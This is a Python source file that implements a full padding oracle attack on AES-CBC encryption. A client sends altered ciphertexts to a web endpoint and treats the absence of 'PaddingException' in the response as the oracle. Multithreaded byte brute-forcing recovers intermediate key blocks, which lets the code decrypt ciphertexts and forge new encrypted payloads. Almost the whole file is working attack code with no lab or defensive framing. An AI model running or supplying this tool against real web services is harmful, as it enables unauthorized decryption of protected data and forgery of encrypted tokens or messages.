import base64
import requests
import time
import threading
import logging

from threading import Lock
from Crypto.Util.Padding import unpad, pad
from binalyzer import Binalyzer, Template

FORMAT = '%(asctime)-15s %(message)s'
logging.basicConfig(format=FORMAT)
logger = logging.getLogger('padding-oracle')

class Base64OracleClient(object): 

    def __init__(self, base_url):
        self._base_url = base_url

    def request(self, block_provider):
        base64_data = base64.b64encode(block_provider.data)
        base64_data = base64_data.decode('utf-8')
        base64_data = base64_data.replace('=', '~').replace('/', '!').replace('+', '-')
        response = requests.get(f"{self._base_url}{base64_data}")
        return self.validate(response)

    def validate(self, response):
        return 'PaddingException' not in response.text


class AESBlockProvider(object):

    def __init__(self, ciphertext=None, block_size=16):
        self._block_size = block_size
        self._template = f"""
            <template>
                <field name="iv" size="{self._block_size}"></field>
                <wrapper name="wrapper" addressing-mode="absolute" offset="0">
                    <vector name="blocks"
                            size="{self._block_size}"
                            count="{{provider=utils.count}}">
                    </vector>
                </wrapper>
            </template>
        """
        self._binalyzer = Binalyzer()
        if ciphertext:
            self.create(ciphertext)

    @property
    def data(self):
        return self._binalyzer.template.value

    @data.setter
    def data(self, value):
        self.create(value)

    @property
    def template(self):
        return self._binalyzer.template

    @property
    def iv(self):
        return self._binalyzer.template.iv

    @property
    def blocks(self):
        blocks = self._binalyzer.template.wrapper.blocks
        if isinstance(blocks, Template):
            return [blocks]
        else:
            return blocks

    @property
    def block_size(self):
        return self._block_size

    def create(self, data):
        return self._binalyzer.xml.from_str(
            self._template, 
            data,
        )

    def resize(self, block_number):
        data = self.data
        data_length = block_number * self.block_size
        self.data = data[:data_length]


class AESIntermediateKeyGenerator(object):

    def __init__(self, client):
        self._client = client
        self.ciphertext = bytes()

    def generate_key_block(self, block_number):
        num_bytes_found = 0
        block_provider = AESBlockProvider(self.ciphertext)
        block_provider.resize(block_number + 2)
        block_size = block_provider.block_size
        key_block = [0x00] * block_size
        for position in range(block_size - 1, -1, -1):
            padding = block_provider.block_size - position
            cipher_block = block_provider.blocks[block_number].value
            key_block[position] = self._find_key_byte(block_provider, block_number, position)
            block_provider.blocks[block_number].value = self._create_padded_block(
                padding + 1,
                cipher_block,
                key_block,
            )
            num_bytes_found += 1
            logger.info('Found byte #%d' % num_bytes_found)
        return key_block

    def _find_key_byte(self, block_provider, block_number, position):
        padding = block_provider.block_size - position
        for i in range(0, 256):
            ciphertext_byte = self._modify_byte(block_provider, block_number, position)
            valid = self._client.request(block_provider)
            if valid:
                return ciphertext_byte ^ padding
        raise RuntimeError('Invalid operation')

    def _modify_byte(self, block_provider, block_number, position, increment=1):
        cipher_block = list(block_provider.blocks[block_number].value)
        cipher_block[position] = 0xFF & (cipher_block[position] + increment)
        block_provider.blocks[block_number].value = bytes(cipher_block)
        return cipher_block[position]

    def _create_padded_block(self, padding, cipher_block, key_block):
        block_size = len(cipher_block)
        position = block_size - padding
        cipher_block_data = list(cipher_block)
        for pos in range(position, block_size):
            cipher_block_data[pos] = padding ^ key_block[pos]
        return bytes(cipher_block_data)


class AESIntermediateKeyParallelGenerator(AESIntermediateKeyGenerator):
    
    def __init__(self, client):
        self._key_byte = []
        self._key_byte_found = False
        self._lock = Lock()
        super(AESIntermediateKeyParallelGenerator, self).__init__(client)

    def _find_key_byte(self, block_provider, block_number, position):
        self._key_byte_found = False
        padding = block_provider.block_size - position
        threads = []
        data = block_provider.data
        current_value = 0
        for thread_number in range(0, 256):
            thread_block_provider = AESBlockProvider(data)
            cipher_block = list(thread_block_provider.blocks[block_number].value)
            current_value = cipher_block[position]
            t = threading.Thread(target=self._ask_oracle,args=(
                    thread_block_provider, 
                    block_number, 
                    position, 
                    padding,
                    thread_number + 1
                ))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        if self._key_byte_found:
            return self._key_byte
        else:
            raise RuntimeError('Invalid operation')

    def _ask_oracle(self, block_provider, block_number, position, padding, increment):
        ciphertext_byte = self._modify_byte(block_provider, block_number, position, increment)
        valid = self._client.request(block_provider)
        if valid and not self._key_byte_found:
            with self._lock:
                self._key_byte_found = True
                self._key_byte = ciphertext_byte ^ padding


class AESPaddingOracle(object):

    def __init__(self, client):
        self.key_generator = AESIntermediateKeyParallelGenerator(client)

    def encrypt(self, plaintext, ciphertext):
        plaintext_block_provider = AESBlockProvider(plaintext)
        ciphertext_block_provider = AESBlockProvider(ciphertext)
        blocks = []
        num_blocks_encrypted = 0
        for i in range(len(plaintext_block_provider.blocks) - 1, -1, -1):
            ciphertext = ciphertext_block_provider.data
            self.key_generator.ciphertext = ciphertext
            plaintext_block = plaintext_block_provider.blocks[i].value
            key_block = self.key_generator.generate_key_block(i)
            ciphertext_block = self._xor_block(plaintext_block, key_block)
            ciphertext_block_provider.blocks[i].value = ciphertext_block
            blocks.insert(0, ciphertext_block)
            num_blocks_encrypted += 1
            logger.info('Encrypted block #%d' % num_blocks_encrypted)
        retval = []
        for block in blocks:
            retval.extend(block)
        ciphertext_block_provider = AESBlockProvider(ciphertext)
        last_block = ciphertext_block_provider.blocks[-1].value
        retval.extend(last_block)
        return bytes(retval)

    def decrypt(self, ciphertext):
        num_blocks_decrypted = 0
        ciphertext_block_provider = AESBlockProvider(ciphertext)
        plaintext_block_provider = AESBlockProvider(ciphertext)
        plaintext_block_provider.resize(len(plaintext_block_provider.blocks) -1)
        plaintext_blocks = plaintext_block_provider.blocks
        self.key_generator.ciphertext = ciphertext
        total_num_blocks = len(ciphertext_block_provider.blocks) - 2
        for block_number in range(total_num_blocks, -1, -1):
            cipher_block = ciphertext_block_provider.blocks[block_number].value
            key_block = self.key_generator.generate_key_block(block_number)
            plaintext_block = self._xor_block(cipher_block, key_block)
            plaintext_blocks[block_number].value = plaintext_block
            num_blocks_decrypted += 1
            logger.info('Decrypted block #%d' % num_blocks_decrypted)
        return unpad(
            plaintext_block_provider.data,
            plaintext_block_provider.block_size
        )

    def _xor_block(self, block_a, block_b):
        return bytes([a ^ b for (a, b) in zip(block_a, block_b)])
